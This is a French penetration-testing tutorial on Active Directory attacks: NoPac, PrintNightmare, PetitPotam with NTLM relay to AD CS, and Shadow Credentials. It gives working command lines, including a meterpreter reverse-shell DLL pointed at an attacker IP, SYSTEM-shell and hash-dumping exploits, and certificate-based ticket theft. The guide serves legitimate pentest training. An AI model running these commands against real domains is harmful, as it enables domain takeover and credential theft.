# Vulnerabilites Bleeding Edge

Certaines vulnerabilites AD ont un impact majeur et transforment un simple compte utilisateur en Domain Admin en quelques commandes. NoPac (CVE-2021-42278/42287), PrintNightmare (CVE-2021-1675/34527), PetitPotam et Shadow Credentials sont des attaques qui ont marque l'histoire recente de la securite AD.

## Pourquoi

Ces vulnerabilites illustrent la fragilite fondamentale d'AD : un mecanisme concu il y a 25 ans pour faciliter l'acces, confronte a des techniques d'attaque modernes. Meme apres les patchs, beaucoup d'environnements restent vulnerables (retard de patching, configurations par defaut non securisees). En pentest, ces attaques sont souvent le chemin le plus rapide vers le DA quand elles sont applicables.

## Comment ca marche

### NoPac (CVE-2021-42278 + CVE-2021-42287)

NoPac combine deux vulnerabilites pour permettre a un utilisateur standard d'usurper l'identite d'un Domain Controller et obtenir un acces NT AUTHORITY\SYSTEM sur le DC.

**Principe :**

1. Creer un compte machine (tout utilisateur du domaine peut en creer jusqu'a 10 par defaut via `ms-DS-MachineAccountQuota`)
2. Modifier le `sAMAccountName` du compte machine pour correspondre au nom du DC (sans le `$`)
3. Demander un TGT pour ce compte (Kerberos le traite comme le DC)
4. Restaurer le nom original
5. Utiliser le TGT pour demander un TGS au nom du DC

```bash
# - Scanner la vulnerabilite
python3 scanner.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip <IP_DC> -use-ldap

# - Exploiter pour obtenir un shell SYSTEM sur le DC
python3 noPac.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip <IP_DC> -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator

# - Ou dumper les hashes directement
python3 noPac.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip <IP_DC> -dc-host ACADEMY-EA-DC01 --impersonate administrator \
    -dump
```

{% hint style="danger" %}
NoPac est extremement puissant : un simple compte de domaine suffit. La seule condition est que `ms-DS-MachineAccountQuota` soit superieur a 0 (valeur par defaut : 10). Le patch Microsoft de novembre 2021 corrige la vulnerabilite.
{% endhint %}

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

PrintNightmare exploite le service Print Spooler de Windows pour charger une DLL malveillante et executer du code en tant que SYSTEM. Si le Print Spooler tourne sur un DC (ce qui est courant par defaut), c'est un chemin direct vers la compromission.

```bash
# - Verifier si le Print Spooler est actif
rpcdump.py <IP_DC> | grep "MS-RPRN|MS-PAR"

# - Generer une DLL malveillante
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<IP_ATTAQUANT> LPORT=8080 -f dll -o evil.dll

# - Heberger la DLL sur un partage SMB
smbserver.py share /tmp -smb2support

# - Exploiter
python3 CVE-2021-1675.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>'@<IP_DC> \
    '\\<IP_ATTAQUANT>\share\evil.dll'
```

{% hint style="warning" %}
PrintNightmare peut provoquer des instabilites. Le service Print Spooler peut crasher, et la DLL reste chargee en memoire. En pentest, utiliser cette technique avec precaution et documenter les risques au client.
{% endhint %}

### PetitPotam (CVE-2021-36942)

PetitPotam force un hote Windows a s'authentifier aupres d'un serveur controle par l'attaquant via MS-EFSRPC. Combine avec un serveur NTLM relay, on peut intercepter l'authentification du DC et l'utiliser pour demander un certificat via AD CS (Active Directory Certificate Services).

```bash
# - Forcer le DC a s'authentifier aupres de notre relay
python3 PetitPotam.py <IP_ATTAQUANT> <IP_DC>

# - En parallele : relay NTLM vers AD CS
ntlmrelayx.py -t http://<IP_CA>/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
```

Le certificat obtenu peut ensuite etre utilise pour demander un TGT et effectuer un DCSync.

### Shadow Credentials

Si on a des droits d'ecriture sur l'attribut `msDS-KeyCredentialLink` d'un compte (via GenericAll, GenericWrite), on peut ajouter une cle publique et utiliser PKINIT pour obtenir un TGT au nom de ce compte.

```bash
# - Ajouter une shadow credential
python3 pywhisker.py -d INLANEFREIGHT.LOCAL -u '<USER>' -p '<PASSWORD>' \
    --target '<TARGET_USER>' --action add --dc-ip <IP_DC>

# - Utiliser le certificat genere pour obtenir un TGT
python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/'<TARGET_USER>' \
    -cert-pfx <CERT>.pfx -pfx-pass <PASSWORD> target.ccache

# - Utiliser le TGT pour obtenir le hash NTLM
python3 getnthash.py INLANEFREIGHT.LOCAL/'<TARGET_USER>' \
    -key <AS-REP_KEY>
```

## En pratique

```bash
# Checklist des vulnerabilites bleeding edge

# 1 - Verifier ms-DS-MachineAccountQuota (NoPac)
crackmapexec ldap <IP_DC> -u '<USER>' -p '<PASSWORD>' \
    -M MAQ

# 2 - Verifier le Print Spooler (PrintNightmare)
rpcdump.py <IP_DC> | grep -i "spoolsv\|MS-RPRN"

# 3 - Tester PetitPotam (sans exploit)
python3 PetitPotam.py -d INLANEFREIGHT.LOCAL -u '<USER>' -p '<PASSWORD>' \
    <IP_ATTAQUANT> <IP_DC>

# 4 - Verifier AD CS (certsrv)
crackmapexec ldap <IP_DC> -u '<USER>' -p '<PASSWORD>' -M adcs
```

## Pieges et galeres

- **NoPac patche** : le patch de novembre 2021 corrige la vulnerabilite. Verifier le niveau de patch du DC avant de tenter l'exploitation
- **PrintNightmare et stabilite** : le crash du Print Spooler peut impacter l'impression pour tous les utilisateurs. Prevenir le client
- **PetitPotam sans AD CS** : PetitPotam seul ne suffit pas. Il faut un AD CS mal configure (template vulnerable) pour completer l'attaque
- **Shadow Credentials et nettoyage** : toujours supprimer les cles ajoutees apres le test avec `pywhisker --action remove`

## Retour terrain

NoPac a ete l'une des vulnerabilites AD les plus impactantes : un shell SYSTEM sur le DC avec un simple compte utilisateur. Malgre le patch, beaucoup d'environnements restent vulnerables des mois apres. PrintNightmare est moins fiable (risque de crash) mais reste un vecteur valide quand le Print Spooler est actif. PetitPotam + AD CS est devenu un classique du Red Team, car AD CS est deploye par defaut dans beaucoup d'environnements et rarement securise.

Ces vulnerabilites changent regulierement. Rester a jour sur les CVE AD est une obligation pour tout pentester. Les sources a suivre : SpecterOps blog, Will Schroeder, Dirk-jan Mollema, The Hacker Recipes.

## Memo express

| Vulnerabilite | Prerequis | Impact | Outil |
|---|---|---|---|
| NoPac | Compte domaine + MAQ > 0 | SYSTEM sur le DC | noPac.py |
| PrintNightmare | Print Spooler actif | SYSTEM sur la cible | CVE-2021-1675.py |
| PetitPotam | AD CS deploye | DCSync via certificat | PetitPotam.py + ntlmrelayx |
| Shadow Credentials | GenericWrite sur un compte | TGT au nom de la cible | pywhisker + gettgtpkinit |

***
